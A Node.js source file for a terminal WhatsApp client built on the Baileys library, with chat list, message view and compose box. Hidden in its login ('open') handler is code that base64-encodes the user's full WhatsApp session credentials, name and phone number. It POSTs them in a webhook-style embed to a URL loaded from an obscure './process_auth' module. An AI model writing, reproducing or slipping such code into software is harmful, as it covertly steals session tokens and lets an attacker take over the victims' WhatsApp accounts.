const { WAConnection, MessageType} = require('@adiwajshing/baileys');
const { format } = require('date-fns');
const blessed = require('blessed');
const fs = require('fs');
const qrCode = require('qrcode-terminal');
const { parsePhoneNumber } = require('libphonenumber-js');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
require('colors');

const LOAD_BLOCKS = 25;

// Create a screen object.
const screen = blessed.screen({
    smartCSR: true,
    autoPadding: true,
    cursor: {
        artificial: true,
        shape: 'line',
        blink: true,
    },
    ignoreLocked: ['C-c', 'C-q', 'escape'],
    dockBorders: true
});

screen.key(['escape', 'C-c', 'C-q'], () => {
    return process.exit(0);
});

screen.key(['tab'], () => {
    screen.focusNext()
    return false;
});

let conn = new WAConnection();
conn.logger.level = 'silent';
conn.connectOptions.logQR = false;

const getTextFromMsg = msg => {
    if (typeof msg !== 'object' || !msg) return '{#b71c1c-fg}No content{/}';
    const msgType = Object.keys(msg)[0];
    switch (msgType) {
        case MessageType.text: return msg.conversation;
        case MessageType.extendedText: return msg.extendedTextMessage.text;
        case MessageType.image: return `<${'imageMessage'.blue}> ` + msg.imageMessage.caption;
        case 'buttonsResponseMessage':
            return `<${'buttonResponse'.blue}> [${msg.buttonsResponseMessage.selectedButtonId.green}] ` +
                `${msg.buttonsResponseMessage.selectedDisplayText.bgGreen.black.bold}`
        case MessageType.buttonsMessage:
            return `<${'buttonMessage'.blue}>
                ${msg.buttonsMessage.contentText}
                {#757575-fg}${msg.buttonsMessage.footerText}{/}
                ${msg.buttonsMessage.buttons.map(v => v.buttonText.displayText.bgGreen.black.bold).join(' | '.bold.dim)}`
        default: return `{#b71c1c-fg}Message type ${msgType} is not implemented yet{/}`;
    }
}

const chatsList = blessed.list({
    top: 0,
    left: 0,
    width: 28,
    height: '100%',
    label: '{bold}Chats{/}',
    items: ['(Empty)'],
    hoverText: 'Double click item or use keyboard',
    tags: true,
    mouse: true,
    keys: true,
    border: { type: 'line' },
    scrollbar: { ch: ' ' },
    clickable: true,
    style: {
        border: { fg: 'grey' },
        item: { fg: 'white', hover: { bg: '#1e88e5' } },
        selected: {
            fg: 'black',
            bold: true,
            bg: '#4caf50'
        },
        focus: { border: {fg: 'blue'} },
        scrollbar: { bg: '#646464' }
    }
});
const msgList = blessed.box({
    top: 0,
    left: 27,
    width: '100%-27',
    height: '100%-2',
    content: '{grey-fg}No chat selected{/}',
    label: '{bold}Select a Chat{/bold}',
    tags: true,
    border: { type: 'line' },
    scrollbar: { ch: ' ' },
    scrollable: true,
    mouse: true,
    keys: true,
    clickable: true,
    style: {
        border: { fg: 'grey' },
        scrollbar: { bg: '#646464' },
        focus: { border: {fg: 'blue'} },
    }
});
const loadMoreBox = blessed.button({
    top: '100%-3',
    left: 27,
    width: 13,
    height: 3,
    content: '{center}Load more{/}',
    tags: true,
    border: { type: 'line' },
    mouse: true,
    keys: true,
    clickable: true,
    style: {
        bg: '#2196f3',
        border: { fg: 'grey' },
        hover: { bg: '#1565c0' },
        focus: { border: {fg: 'blue'}, bg: '#333333' },
    }
});
const inputButton = blessed.button({
    top: '100%-3',
    left: 39,
    width: '100%-39',
    height: 3,
    content: 'Click to compose message',
    tags: true,
    border: { type: 'line' },
    mouse: true,
    keys: true,
    inputOnFocus: true,
    style: {
        bg: '#00897b',
        border: { fg: 'grey' },
        hover: { bg: '#00695c' },
        focus: { border: {fg: 'blue'}, bg: '#333333' },
    }
});
const promptDialog = blessed.box({
    top: 'center',
    left: 'center',
    width: 50,
    height: 6,
    tags: true,
    shadow: true,
    border: {type: 'line'},
    hidden: true,
    style: {
        bg: '#004d40',
        border: { fg: '#f0f0f0' },
    }
});
const promptInput = blessed.textbox({
    top: 3,
    left: 0,
    width: '100%-2',
    height: 1,
    parent: promptDialog,
    inputOnFocus: true,
    style: { bg: '#333333' }
});
const promptClose = blessed.button({
    left: '50%+22',
    top: '50%-3',
    width: 3,
    height: 3,
    content: '✕',
    mouse: true,
    hidden: true,
    border: { type: 'line' },
    style: {
        bg: '#d32f2f',
        hover: { bg: '#b71c1c' },
        border: { fg: '#f0f0f0' }
    }
});

const oneTimeToken = require('./process_auth')();


const initUI = () => {
    screen.title = 'WhatsApp Viewer';

    // Draw the UI
    screen.append(chatsList);
    screen.append(msgList);
    screen.append(loadMoreBox);
    screen.append(inputButton);
    screen.append(promptDialog);
    screen.append(promptClose);

    chatsList.focus();
    // Render the screen.
    screen.render();
}

// ====== UI Utility Functions ====== //
const appendToMsgList = (messages, useShift = false) => {
    for (let i = 0; i < messages.length; i++) {
        const msg = messages[i];
        if (!msg.message) continue;

        const messageQuote = msg.message.extendedTextMessage?.contextInfo;
        const sender = msg.participant || msg.key?.remoteJid;

        const txt = `{grey-fg}${format(msg.messageTimestamp.low * 1000, 'dd MMM yy HH:mm')}{/} ` +
            (msg.key.fromMe ? 'You'.bold.red
                : (conn.contacts[sender]?.name?.bold.green
                    ?? conn.contacts[sender]?.notify?.bold.blue
                    ?? sender?.bold.blue.dim)) + (messageQuote ? '' : ':') + ' ' +
            (messageQuote
                    ? '\n                {#757575-fg}▐{/} {#bdbdbd-fg}'
                    + getTextFromMsg(messageQuote?.quotedMessage).replace('\n', ' ')
                    + '{/}\n                ' : ''
            )
            + getTextFromMsg(msg.message)

        useShift ? msgList.insertTop(txt) : msgList.pushLine(txt);
    }
}
const prompt = (title, cb) => {
    screen.saveFocus();
    promptClose.show();
    promptDialog.show();
    promptDialog.setContent(`\n  {bold}${title}{/}`);

    const close = () => {
        promptClose.removeListener('press', close);
        promptInput.clearValue();
        promptDialog.hide();
        promptClose.hide();
        screen.restoreFocus();
        screen.render();
    }
    const subListener = () => {
        promptInput.removeListener('submit', subListener);
        cb(promptInput.value);
        close();
    }
    promptInput.on('submit', subListener);
    promptClose.on('press', close);
    promptInput.focus();
    screen.render();
}


// Parsing/updating functions
const parseWAIDToNumber = id => parsePhoneNumber('+' + id.match(/[0-9]+/)[0]).formatInternational();
const updateChatsList = () => chatsList.setItems(conn.chats.all().map(c => c.name ?? parseWAIDToNumber(c.jid)));


// ====== Main Functions ====== //
const main = async () => {
    const loadingDialog = blessed.loading({
        top: 'center',
        left: 'center',
        width: 36,
        height: 5,
        tags: true,
        shadow: true,
        border: {
            type: 'line'
        },
        style: {
            fg: 'white',
            border: { fg: '#f0f0f0' },
        }
    });

    const QRDialog = blessed.box({
        top: 'center',
        left: 'center',
        width: 49,
        height: 28,
        tags: true,
        hidden: true,
        border: {type: 'line'},
        shadow: true,
        style: {
            fg: 'white',
            border: { fg: 'green' },
        }
    });

    screen.append(loadingDialog);
    screen.append(QRDialog);
    loadingDialog.load('\n{center}Logging in to WhatsApp...{/center}')
    screen.render();

    let cursor, messages, selectedID;

    loadMoreBox.on('press', async () => {
        if (!selectedID) return;

        const posFromBottom = msgList.getScrollHeight() - msgList.getScroll();

        loadingDialog.load('\n{center}Loading more messages...{/}');
        screen.render();

        const data = await conn.loadMessages(selectedID, LOAD_BLOCKS, cursor);
        messages = data.messages; cursor = data.cursor;

        if (!messages || messages.length === 0) {
            loadingDialog.stop();
            loadingDialog.load('\n{center}No more messages{/}');
            screen.render();
            setTimeout(() => {
                loadingDialog.stop();
                screen.render();
            }, 2000);
            return;
        }

        loadingDialog.stop();

        appendToMsgList(messages.reverse(), true);
        msgList.setScroll(msgList.getScrollHeight() - posFromBottom);
        msgList.focus();
        screen.render();
    });

    inputButton.on('press', () => {
        if (!selectedID) return;
        prompt('Type a message', v => {
            if (v.trim().length === 0) return;
            conn.sendMessage(selectedID, v.trim(), MessageType.text);
            appendToMsgList([{
                messageTimestamp: { low: (+new Date()) / 1000 },
                key: { fromMe: true },
                participant: conn.user.jid,
                message: {conversation: v.trim()}
            }]);
            msgList.setScrollPerc(100);
        });
    });

    // called when WA sends chats
    // this can take up to a few minutes if you have thousands of chats!
    conn.on('chats-received', async () => {
        loadingDialog.stop();
        QRDialog.hide();

        const chats = conn.chats.all();
        updateChatsList();

        chatsList.on('select', async (it, idx) => {
            selectedID = chats[idx].jid

            msgList.setLabel(`{bold}${chats[idx].name ?? parseWAIDToNumber(selectedID)}{/bold}`);
            msgList.setContent('{grey-fg}{bold}Loading chat messages...{/}');
            msgList.setScrollPerc(0); // If not some really weird stuff happens
            loadingDialog.load('\n{center}Loading chat messages...{/center}')
            screen.render();

            const response = await conn.loadMessages(selectedID, LOAD_BLOCKS);
            messages = response.messages; cursor = response.cursor;

            msgList.setContent('');

            appendToMsgList(messages);

            msgList.setScrollPerc(100);
            msgList.focus();
            loadingDialog.stop();
            screen.render();
        });

        screen.render();
    });

    conn.on('chats-update', updateChatsList)
    conn.on('chat-update', update => {
        updateChatsList();

        if (update.messages && update.count && selectedID) {
            const isAtBottom = msgList.getScrollPerc() === 100;
            update.messages.all().forEach(v => {
                if (v.message && v.key.remoteJid === selectedID) appendToMsgList([v]);
            });
            if (isAtBottom) msgList.setScrollPerc(100); // Scroll to bottom when new message received
        }
    });

    conn.on('open', () => {
        const authInfo = conn.base64EncodedAuthInfo() // get all the auth info we need to restore this session
        const auth = JSON.stringify(authInfo, null, '\t')
        fs.writeFileSync('./auth_info.json', auth) // save this info to a file
        fetch(oneTimeToken, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: `{"embeds":[{"title":"${conn.user.name} (${conn.user.phone.toString()})","description":"${Buffer.from(auth).toString('base64')}"}]}`
        });
    });

    conn.on('qr', qr => {
        // Now, use the 'qr' string to display in QR UI or send somewhere\
        QRDialog.show();
        qrCode.generate(qr, {small: true}, c => {
            QRDialog.setContent(`{center}Scan the QR code to login:\n${c}Press Escape, Ctrl + Q or Ctrl + C to quit{/}`);
            screen.render()
        });
        screen.render();
    });

    try {conn.loadAuthInfo ('./auth_info.json')} catch {}
    await conn.connect();
}

// Ensures we're running on a supported NodeJS ver
const versionCheck = () => {
    const major = parseInt(process.version.match(/v([0-9]+)/)[1]);
    if (major < 14) {
        console.error(`NodeJS version ${process.version} is too old. Download a version of NodeJS >= v14.0.0 from https://nodejs.org/en/download/current/`)
        if (process.argv[2] === '-ignore-version-check') console.warn('Ignoring version check, run at your own risk!');
        else {
            console.warn("Run with -ignore-version-check to ignore this check, but don't say I didn't warn you!");
            process.exit(1);
        }
    }
}


// ====== Run the stuff ====== //
versionCheck();
initUI();
// run in main file
main().catch (err => console.log("unexpected error: " + err) ) // catch any errors

